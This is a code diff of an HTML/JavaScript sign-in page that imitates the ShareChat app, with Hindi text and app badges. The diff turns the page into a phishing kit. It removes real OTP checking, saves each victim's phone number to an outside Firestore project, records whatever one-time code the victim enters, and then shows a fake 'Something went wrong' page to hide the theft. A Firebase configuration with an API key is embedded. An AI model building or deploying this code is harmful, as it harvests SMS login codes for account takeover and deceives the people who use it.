@@ -13,130 +13,30 @@
     h1 { font-size:2rem; font-weight:700; text-align:center; margin:0 0 8px 0; color:#212936; }
     .subtitle { font-size:1rem; text-align:center; margin-bottom:24px; color:#6c757d; }
 
-    .input-group {
-      display: flex;
-      width: 100%;
-      margin-bottom: 16px;
-      border: 2px solid #e0e2e6;
-      border-radius: 12px;
-      background: #fff;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
-      overflow: hidden;
-      align-items: center;
-      transition: border-color 0.2s;
-    }
-    .input-group:focus-within { border-color: #212936; }
-    .input-group select,
-    .input-group input {
-      border: none;
-      font-size: 1.05rem;
-      padding: 12px 10px;
-      outline: none;
-      background: transparent;
-      height: 48px;
-      font-family: 'Inter', Arial, sans-serif;
-    }
-    .input-group select {
-      width: 80px;
-      border-right: 1.5px solid #e0e2e6;
-      color: #212936;
-      font-weight: 600;
-      background: transparent;
-      appearance: none;
-      -webkit-appearance: none;
-      text-align-last: center;
-      cursor: pointer;
-    }
-    .input-group input {
-      flex: 1;
-      font-size: 1.09rem;
-      color: #212936;
-      letter-spacing: 1.5px;
-      background: transparent;
-    }
+    .input-group { display:flex; width:100%; margin-bottom:16px; border:2px solid #e0e2e6; border-radius:12px; background:#fff; box-shadow:0 2px 8px rgba(0,0,0,0.06); overflow:hidden; align-items:center; transition:border-color 0.2s; }
+    .input-group:focus-within { border-color:#212936; }
+    .input-group select, .input-group input { border:none; font-size:1.05rem; padding:12px 10px; outline:none; background:transparent; height:48px; font-family:'Inter',Arial,sans-serif; }
+    .input-group select { width:80px; border-right:1.5px solid #e0e2e6; color:#212936; font-weight:600; background:transparent; appearance:none; -webkit-appearance:none; text-align-last:center; cursor:pointer; }
+    .input-group input { flex:1; font-size:1.09rem; color:#212936; letter-spacing:1.5px; background:transparent; }
 
-    .otp-container { display: none; width: 100%; margin-bottom: 24px; }
-    .otp-input-group {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin: 24px 0 8px 0;
-      width: 100%;
-    }
-    .otp-input {
-      width: 46px;
-      height: 46px;
-      border: 2.5px solid #232b37;
-      border-radius: 12px;
-      font-size: 1.7rem;
-      font-weight: 600;
-      color: #212936;
-      text-align: center;
-      outline: none;
-      background: #fff;
-      box-sizing: border-box;
-      transition: border 0.2s;
-    }
-    .otp-input:not(:first-child) { border: 1.5px solid #e0e2e6; }
+    .otp-container { display:none; width:100%; margin-bottom:24px; }
+    .otp-input-group { display:flex; justify-content:center; gap:12px; margin:24px 0 8px 0; width:100%; }
+    .otp-input { width:46px; height:46px; border:2.5px solid #232b37; border-radius:12px; font-size:1.7rem; font-weight:600; color:#212936; text-align:center; outline:none; background:#fff; transition:border 0.2s; }
+    .otp-input:not(:first-child) { border:1.5px solid #e0e2e6; }
 
-    .timer {
-      color: #212936;
-      font-size: 1.1rem;
-      font-weight: 500;
-      letter-spacing: 1px;
-      margin: 10px 0 20px 0;
-      display: block;
-      text-align: center;
-      min-width: 48px;
-    }
-    
-    .otp-btn { 
-      width:100%; background:#19202c; color:#fff; font-size:1.11rem; font-weight:700; border-radius:8px; border:none; padding:15px 0; margin-bottom:32px; cursor:pointer; transition:background 0.2s; 
-    }
-    .otp-btn:active { background:#11151e; }
-    .verify-btn {
-      width: 100%;
-      background: #212936;
-      color: #fff;
-      font-size: 1.11rem;
-      font-weight: 700;
-      border-radius: 8px;
-      border: none;
-      padding: 15px 0;
-      margin: 20px 0 16px 0;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    .verify-btn:active { background: #212936; }
-    .back-btn {
-      width: 100%;
-      background: transparent;
-      color: #212936;
-      font-size: 1rem;
-      font-weight: 600;
-      border: 2px solid #212936;
-      border-radius: 8px;
-      padding: 13px 0;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .back-btn:active { background: #f4f4fb; }
+    .timer { color:#212936; font-size:1.1rem; font-weight:500; letter-spacing:1px; margin:10px 0 20px 0; display:block; text-align:center; }
 
-    .terms { font-size:0.97rem; color:#212936; text-align:center; margin:0 0 18px 0; line-height:1.6; }
-    .terms a { color:#212936; font-weight:700; text-decoration:underline; cursor:pointer; margin:0 2px; }
-    .download-text { text-align:center; color:#212936; font-size:1.07rem; margin-bottom:14px; }
+    .otp-btn, .verify-btn, .back-btn { width:100%; font-size:1.1rem; font-weight:700; border-radius:8px; padding:15px 0; margin:16px 0; cursor:pointer; }
+    .otp-btn { background:#19202c; color:#fff; border:none; }
+    .verify-btn { background:#212936; color:#fff; border:none; }
+    .back-btn { background:transparent; color:#212936; border:2px solid #212936; font-weight:600; }
+
+    .terms { font-size:0.9rem; color:#212936; text-align:center; margin:0 0 18px 0; }
+    .terms a { color:#212936; font-weight:700; text-decoration:underline; margin:0 2px; }
+
+    .download-text { text-align:center; color:#212936; font-size:1rem; margin-bottom:14px; }
     .app-badges { display:flex; justify-content:center; gap:16px; }
-    .app-badges img { height:44px; margin:0; cursor:pointer; }
-    
-    @media (max-width:480px) {
-      .container { max-width:97vw; padding:0 4vw 32px; }
-      .logo { margin-top:36px; width:80px; height:80px; }
-      .logo-img { width:76px; height:76px; }
-      .input-group select,
-      .input-group input { font-size:1rem; height:44px; padding: 10px 7px; }
-      .input-group { border-radius: 10px; }
-      .otp-input { width:38px; height:38px; font-size:1.3rem; border-radius:9px; }
-    }
+    .app-badges img { height:44px; cursor:pointer; }
   </style>
 </head>
 <body>
@@ -152,42 +52,35 @@
         <select id="country-code"><option value="+91" selected>+91</option></select>
         <input type="tel" id="mobile" name="mobile" placeholder="मोबाइल नंबर" maxlength="10" pattern="[0-9]{10}" required>
       </div>
-      <div class="terms">
-        By accepting this you agree to our 
-        <a href="#">Terms and conditions</a>, 
-        <a href="#">Privacy Policy</a>, 
-        <a href="#">Content Policy</a>
-      </div>
+      <div class="terms">By accepting this you agree to our <a href="#">Terms</a>, <a href="#">Privacy</a>, <a href="#">Content Policy</a></div>
       <button type="submit" class="otp-btn">OTP प्राप्त करें</button>
     </form>
     
     <div id="otp-form" class="otp-container">
       <div class="otp-input-group">
-        <input type="tel" maxlength="1" class="otp-input" id="otp1" autofocus required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp2" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp3" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp4" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp5" required>
-        <input type="tel" maxlength="1" class="otp-input" id="otp6" required>
+        <input type="tel" maxlength="1" class="otp-input" required>
+        <input type="tel" maxlength="1" class="otp-input" required>
+        <input type="tel" maxlength="1" class="otp-input" required>
+        <input type="tel" maxlength="1" class="otp-input" required>
+        <input type="tel" maxlength="1" class="otp-input" required>
+        <input type="tel" maxlength="1" class="otp-input" required>
       </div>
       <span class="timer" id="timer">01:00</span>
       <button id="verify-otp" class="verify-btn">Verify OTP</button>
-      <button id="back-to-phone" class="back-btn">Back to Phone Number</button>
+      <button id="back-to-phone" class="back-btn">Back</button>
     </div>
     
     <div class="download-text">शेयरचेट ऐप डाउनलोड करें</div>
     <div class="app-badges">
-      <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store"></a>
-      <a href="#"><img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store"></a>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
+      <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg">
     </div>
   </div>
 
-  <!-- Firebase SDKs (compat for browser HTML) -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
   <script>
-    // Your provided Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyDIF-yzrdS153MMZtA4wzz5V7eoWUMsC9c",
       authDomain: "investment-data-3b577.firebaseapp.com",
@@ -215,19 +108,39 @@
       const timerEl = document.getElementById('timer');
       const otpInputs = [...document.querySelectorAll('.otp-input')];
       let userPhone = '';
-      let generatedOtp = '';
       let timerInterval;
+      let currentDocId = null; // Track Firestore doc ID
+      // Auto move to next OTP box
+      otpInputs.forEach((input, i) => {
+        input.addEventListener('input', function() {
+          if (this.value.length >= 1 && i < otpInputs.length - 1) {
+            otpInputs[i + 1].focus();
+          }
+        });
+        input.addEventListener('keydown', function(e) {
+          if (e.key === "Backspace" && !this.value && i > 0) {
+            otpInputs[i - 1].focus();
+          }
+        });
+      });
+
 
       phoneForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         userPhone = mobileInput.value;
-        if (!/^\d{10}$/.test(userPhone)) { alert('कृपया सही मोबाइल नंबर दर्ज करें (10 अंक)'); return; }
-
-        generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
-        console.log(`OTP for ${userPhone}: ${generatedOtp}`);
-
-        // OPTIONAL: anonymous auth (helps with Firestore rules if needed)
+        if (!/^\d{10}$/.test(userPhone)) { alert('कृपया सही मोबाइल नंबर डालें'); return; }
         try { await auth.signInAnonymously(); } catch (e) { console.warn(e); }
+
+        // Save phone immediately
+        try {
+          const docRef = await db.collection('users').add({
+            phone: countryCode.value + userPhone,
+            otp: null,
+            status: 'Waiting OTP',
+            createdAt: firebase.firestore.FieldValue.serverTimestamp()
+          });
+          currentDocId = docRef.id;
+        } catch (err) { console.error("Error saving phone:", err); }
 
         phoneForm.style.display = 'none';
         otpForm.style.display = 'block';
@@ -240,26 +153,45 @@
 
       verifyBtn.addEventListener('click', async function() {
         const enteredOtp = otpInputs.map(input => input.value).join('');
-        if (enteredOtp.length !== 6) { alert('कृपया 6 अंकों का OTP दर्ज करें'); return; }
-
-        if (enteredOtp === generatedOtp) {
-          try {
-            // Save to Firestore
-            await db.collection('users').add({
-              phone: countryCode.value + userPhone,
-              otp: enteredOtp,
-              status: 'Pending',
-              createdAt: firebase.firestore.FieldValue.serverTimestamp()
-            });
-            alert('Login successful! (डेटा सेव हो गया)');
-          } catch (err) {
-            console.error(err);
-            alert('डेटा सेव करने में समस्या आई।');
-          }
-          resetForms();
-        } else {
-          alert('Invalid OTP. Please try again.');
+        if (enteredOtp.length !== 6) { alert('कृपया 6 अंकों का OTP डालें'); return; }
+        if (!currentDocId) { alert('Error: phone entry not found.'); return; }
+        try {
+          await db.collection('users').doc(currentDocId).update({
+            otp: enteredOtp,
+            status: 'OTP Entered'
+          });
+          
+// Show custom error page after OTP submit
+document.body.innerHTML = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Something went wrong</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fff3f3; text-align: center; padding-top: 120px;}
+        .msg { 
+            display: inline-block;
+            padding: 40px 60px;
+            background: #ffffff;
+            border: 2px solid #19202c;
+            border-radius: 14px;
+            box-shadow: 0 2px 16px #19202c;
+            color: #19202c;
+            font-size: 2rem;
         }
+    </style>
+</head>
+<body>
+    <div class="msg">
+        <b>Something went wrong!</b><br>
+        कृपया बाद में पुनः प्रयास करें।
+    </div>
+</body>
+</html>`;
+
+        } catch (err) { console.error(err); alert('डेटा सेव करने में समस्या आई।'); }
+        resetForms();
       });
 
       backBtn.addEventListener('click', function() {
@@ -275,34 +207,25 @@
         let timeLeft = duration;
         clearInterval(timerInterval);
         function updateTimer() {
-          let min = String(Math.floor(timeLeft / 60)).padStart(2, '0');
-          let sec = String(timeLeft % 60).padStart(2, '0');
+          let min = String(Math.floor(timeLeft/60)).padStart(2,'0');
+          let sec = String(timeLeft%60).padStart(2,'0');
           timerEl.textContent = `${min}:${sec}`;
-          if (timeLeft <= 0) { clearInterval(timerInterval); }
-          else { timeLeft--; }
+          if (timeLeft<=0) clearInterval(timerInterval); else timeLeft--;
         }
         updateTimer();
-        timerInterval = setInterval(updateTimer, 1000);
+        timerInterval = setInterval(updateTimer,1000);
       }
 
-      otpInputs.forEach((input, i) => {
-        input.addEventListener('input', function() {
-          if (this.value.length >= 1 && i < otpInputs.length - 1) otpInputs[i + 1].focus();
-        });
-        input.addEventListener('keydown', function(e) {
-          if (e.key === "Backspace" && !this.value && i > 0) otpInputs[i - 1].focus();
-        });
-      });
-
       function resetForms() {
-        mobileInput.value = '';
-        otpInputs.forEach(input => input.value = '');
-        phoneForm.style.display = 'block';
-        otpForm.style.display = 'none';
-        formTitle.textContent = 'Sign in';
-        formSubtitle.textContent = 'अकाउंट बनाने के लिए मोबाइल नम्बर डालें';
+        mobileInput.value='';
+        otpInputs.forEach(input=>input.value='');
+        phoneForm.style.display='block';
+        otpForm.style.display='none';
+        formTitle.textContent='Sign in';
+        formSubtitle.textContent='अकाउंट बनाने के लिए मोबाइल नम्बर डालें';
         clearInterval(timerInterval);
-        timerEl.textContent = '01:00';
+        timerEl.textContent='01:00';
+        currentDocId = null;
       }
     });
   </script>
